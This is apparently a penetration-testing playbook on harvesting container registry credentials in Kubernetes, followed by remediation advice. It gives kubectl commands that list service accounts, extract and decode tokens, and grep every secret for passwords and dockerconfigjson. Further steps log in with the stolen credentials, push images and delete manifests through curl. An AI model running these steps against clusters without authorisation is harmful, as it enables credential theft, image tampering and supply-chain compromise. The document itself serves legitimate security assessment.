
# Kubernetes Image Registry Credential Harvesting

## 1. Overview Section

This document outlines the vulnerability of harvesting image registry credentials within a Kubernetes environment. An attacker who can successfully harvest these credentials can pull, push, and potentially modify container images stored within the compromised registry. This provides a significant foothold for further exploitation and privilege escalation within the Kubernetes cluster and the broader infrastructure.

**Attack Vector Description:**

The attack vector involves identifying and extracting stored image registry credentials from various locations within the Kubernetes cluster. This can include, but is not limited to:

*   Service Account tokens with elevated permissions.
*   Configuration files containing registry credentials (e.g., `docker config.json`).
*   Environment variables within running pods.
*   Secrets stored in the Kubernetes Secrets API, which might be poorly managed or inappropriately scoped.
*   Leaked credentials in code repositories, configuration management systems, or CI/CD pipelines used by the Kubernetes cluster.

**Potential Impact and Consequences:**

*   **Image Tampering:** The attacker can modify existing container images in the registry, injecting malicious code. This code will then be executed when these images are deployed in the cluster, leading to widespread compromise.
*   **Denial of Service:** By deleting or corrupting images, the attacker can disrupt application deployments and services.
*   **Data Exfiltration:**  Compromised images can be used to exfiltrate sensitive data from the cluster.
*   **Supply Chain Attacks:** Injecting malicious code into base images can poison the entire software supply chain.
*   **Lateral Movement:** The attacker can use the compromised image registry to deploy malicious containers that provide access to other parts of the infrastructure.

**Risk Level Assessment:**

*   **Critical:** If registry access allows unrestricted pull, push, and delete operations.
*   **High:** If registry access allows pull and push, but delete operations are restricted.
*   **Medium:** If access is restricted to read-only (pull) operations, or if credentials have limited scope.

**Technical Explanation:**

Kubernetes relies on image registries to store and distribute container images. Securely managing the credentials used to access these registries is crucial. Misconfigured RBAC (Role-Based Access Control), overly permissive service accounts, poor secret management, and exposed environment variables can all lead to credential harvesting. Attackers can leverage these vulnerabilities to gain unauthorized access to the image registry.

**Prerequisites and Conditions Needed:**

*   Access to a Kubernetes cluster, even with limited permissions (e.g., read-only access to some resources).
*   The ability to execute commands within a pod or to inspect the cluster's configuration.
*   Knowledge of common Kubernetes resource types and their configuration.

## 2. Validation and Exploitation Steps Section

This section details the steps required to validate the existence of and exploit the image registry credential harvesting vulnerability.

**Phase 1: Validation - Identifying Potential Credential Sources**

**Step 1: Listing Service Accounts and Roles**

```bash
kubectl get serviceaccounts --all-namespaces
```

*   **Explanation:** This command lists all Service Accounts in all namespaces. Service Accounts are identities for processes running within pods and can be bound to roles that grant permissions.
*   **Why:** Some Service Accounts might be configured with overly permissive roles that allow access to secrets or other sensitive resources.
*   **Expected Output:** A list of Service Accounts with their namespaces.  Look for Service Accounts with names that suggest they might have elevated permissions (e.g., `admin`, `registry-access`, `builder`).
*   **Validation:** This step helps identify potential targets for further investigation.

**Step 2: Checking Role Bindings for Promising Service Accounts**

```bash
kubectl get rolebindings --all-namespaces -o yaml | grep "serviceaccount.name: <SERVICE_ACCOUNT_NAME>" -B 5
kubectl get clusterrolebindings -o yaml | grep "serviceaccount.name: <SERVICE_ACCOUNT_NAME>" -B 5
```

*   **Explanation:**  These commands search for RoleBindings and ClusterRoleBindings that grant permissions to a specific Service Account. Replace `<SERVICE_ACCOUNT_NAME>` with the name of a Service Account identified in Step 1.  The `-B 5` flag prints the 5 lines before the matching line, providing context.
*   **Why:**  To determine what permissions a service account has by looking at the roles bound to it.
*   **Expected Output:** YAML output showing the RoleBinding/ClusterRoleBinding configuration, including the roles assigned to the Service Account.
*   **Validation:** Look for roles that grant broad access, such as `cluster-admin`, `get/list/watch` on `secrets`, or the ability to create/update pods.

**Step 3: Inspecting Service Account Secrets**

```bash
kubectl describe serviceaccount <SERVICE_ACCOUNT_NAME> -n <NAMESPACE>
```

*   **Explanation:** This command describes a specific Service Account, showing details including the associated secrets.
*   **Why:** Service Accounts often have secrets (tokens) associated with them that can be used for authentication.
*   **Expected Output:** Information about the Service Account, including a list of secrets. The secrets will have names that follow a pattern like `<SERVICE_ACCOUNT_NAME>-token-<RANDOM_STRING>`.
*   **Validation:** If a service account has Secrets associated with it, proceed to the next step.

**Step 4: Extracting the Service Account Token**

```bash
SECRET_NAME=$(kubectl get serviceaccount <SERVICE_ACCOUNT_NAME> -n <NAMESPACE> -o jsonpath='{.secrets[0].name}')
TOKEN=$(kubectl get secret $SECRET_NAME -n <NAMESPACE> -o jsonpath='{.data.token}' | base64 -d)
echo $TOKEN
```

*   **Explanation:** These commands retrieve the token associated with the service account.  The first line gets the name of the secret associated with the service account. The second line then retrieves the token from that secret and decodes it from base64.  The `echo` command displays the decoded token.
*   **Why:** This token can be used to authenticate as the service account.
*   **Expected Output:**  A long string representing the service account token.
*   **Validation:**  If a token is successfully extracted, it can be used to authenticate with the Kubernetes API server (although not directly the image registry, but it could provide access to other secrets containing image registry credentials)

**Step 5: Checking for Secrets Containing Registry Credentials**

```bash
kubectl get secrets --all-namespaces -o yaml | grep -i "dockerconfigjson" -B 5
kubectl get secrets --all-namespaces -o yaml | grep -i "registry" -B 5
kubectl get secrets --all-namespaces -o yaml | grep -i "password" -B 5
```

*   **Explanation:** These commands search all secrets for keywords commonly associated with image registry credentials: `dockerconfigjson`, `registry`, and `password`. The `-B 5` flag prints the 5 lines before the matching line, providing context.
*   **Why:** Secrets are often used to store sensitive information, including image registry credentials.
*   **Expected Output:** YAML output showing secrets that contain the specified keywords. Look for secrets with names like `docker-registry`, `registry-secret`, or similar.
*   **Validation:** This step identifies secrets that might contain image registry credentials.

**Step 6: Decoding and Inspecting Secrets**

```bash
SECRET_NAME=<SECRET_NAME_FROM_STEP_5>
NAMESPACE=<NAMESPACE_OF_SECRET>
CREDENTIALS=$(kubectl get secret $SECRET_NAME -n $NAMESPACE -o jsonpath='{.data."\.dockerconfigjson"}' | base64 -d)
echo $CREDENTIALS
```

*   **Explanation:** This command retrieves the contents of a secret identified in Step 5 and decodes it from base64. Replace `<SECRET_NAME_FROM_STEP_5>` and `<NAMESPACE_OF_SECRET>` with the appropriate values. If the secret doesn't contain `.dockerconfigjson`, try keys like `username`, `password`, `registry-url`, etc.
*   **Why:** This allows you to view the actual credentials stored within the secret.
*   **Expected Output:** The decoded contents of the secret, which might be a `docker config.json` file or individual credentials.
*   **Validation:** Examine the output to confirm that it contains image registry credentials (username, password, server address).

**Phase 2: Exploitation - Using the Harvested Credentials**

**Step 7: Logging in to the Image Registry Using Docker**

```bash
docker login -u <USERNAME> -p <PASSWORD> <REGISTRY_URL>
```

*   **Explanation:** This command uses the `docker login` command to authenticate with the image registry using the harvested credentials.  Replace `<USERNAME>`, `<PASSWORD>`, and `<REGISTRY_URL>` with the values obtained in Step 6.
*   **Why:** This verifies that the credentials are valid and allows you to interact with the image registry.
*   **Expected Output:** `Login Succeeded`. If the login fails, double-check the credentials and the registry URL.
*   **Exploitation:** Successful login confirms that the credentials are valid and allows you to pull and potentially push images to the registry.

**Step 8: Pulling Images from the Registry**

```bash
docker pull <REGISTRY_URL>/<IMAGE_NAME>:<TAG>
```

*   **Explanation:** This command pulls an image from the compromised registry. Replace `<REGISTRY_URL>`, `<IMAGE_NAME>`, and `<TAG>` with the appropriate values.
*   **Why:** To verify read access and demonstrate the ability to retrieve images.
*   **Expected Output:** The image being pulled to your local machine.
*   **Exploitation:** This confirms read access to the registry.

**Step 9: (Potentially) Pushing Images to the Registry (If Permissions Allow)**

```bash
docker tag <LOCAL_IMAGE> <REGISTRY_URL>/<NEW_IMAGE_NAME>:<NEW_TAG>
docker push <REGISTRY_URL>/<NEW_IMAGE_NAME>:<NEW_TAG>
```

*   **Explanation:**  These commands tag a local image with the registry's URL and then push it to the registry. Replace `<LOCAL_IMAGE>`, `<REGISTRY_URL>`, `<NEW_IMAGE_NAME>`, and `<NEW_TAG>` with the appropriate values.
*   **Why:** To verify write access and demonstrate the ability to upload images.
*   **Expected Output:** The image being pushed to the registry. If the push fails, it indicates that the credentials do not have write permissions.
*   **Exploitation:** This confirms write access to the registry, allowing image tampering.

**Step 10: (Potentially) Deleting Images from the Registry (If Permissions Allow)**

This step is highly dependent on the registry and authentication mechanism used. There is no standard `docker` command for image deletion. Most registries use their own API endpoints for this purpose. This step is included for completeness but will need to be researched and implemented based on the specific registry being targeted. This might involve using `curl` or similar tools to make API requests to the registry's deletion endpoint.

*   **Example (Generic - Requires Registry-Specific API Endpoint):**

    ```bash
    # This is a PLACEHOLDER - Replace with the actual API endpoint and authentication headers
    REGISTRY_URL=<REGISTRY_URL>
    IMAGE_NAME=<IMAGE_NAME>
    TAG=<TAG>
    TOKEN=$TOKEN #Use the Service Account token, or credentials retrieved from the docker config.json

    curl -X DELETE "${REGISTRY_URL}/v2/${IMAGE_NAME}/manifests/${TAG}" \
         -H "Authorization: Bearer ${TOKEN}"
    ```

    *   **Explanation:** This attempts to delete an image manifest from the registry using its API.
    *   **Why:**  This verifies if the acquired credentials have delete permissions
    *   **Expected Output:** A successful deletion will likely return a 202 Accepted or 200 OK status code.  A failure will return an error code (e.g., 403 Forbidden).
    *   **Exploitation:** This demonstrates the full scope of control, including the ability to disrupt services by deleting images.

## Remediation Recommendations

*   **Least Privilege Principle:**  Grant Service Accounts and users only the minimum necessary permissions required to perform their tasks. Avoid assigning broad roles like `cluster-admin` unless absolutely necessary.
*   **Secure Secret Management:**  Use Kubernetes Secrets to store sensitive information like image registry credentials. Implement RBAC to restrict access to Secrets to only authorized users and Service Accounts. Consider using external secret management solutions like HashiCorp Vault.
*   **Regularly Rotate Credentials:**  Rotate image registry credentials regularly to minimize the impact of potential compromises.
*   **Image Registry Access Control:**  Implement access controls at the image registry level to restrict who can pull, push, and delete images.
*   **Audit Logging:**  Enable audit logging in Kubernetes to track API calls and identify suspicious activity.
*   **Container Image Scanning:**  Regularly scan container images for vulnerabilities and malware.
*   **Implement Network Policies:**  Use network policies to restrict network traffic between pods and limit the potential impact of compromised containers.
*   **Review CI/CD Pipelines:**  Ensure that CI/CD pipelines are securely configured and do not expose sensitive credentials. Avoid storing credentials in code repositories.
*   **Principle of Immutability:** Design infrastructure so that images shouldn't need updating. Rebuild images as needed.
*   **Policy-Based Access Control:** Implement Policy-Based Access Control tools such as OPA Gatekeeper or Kyverno to enforce policies on resources within the Kubernetes cluster, specifically focusing on preventing the creation of overly permissive roles or service accounts.
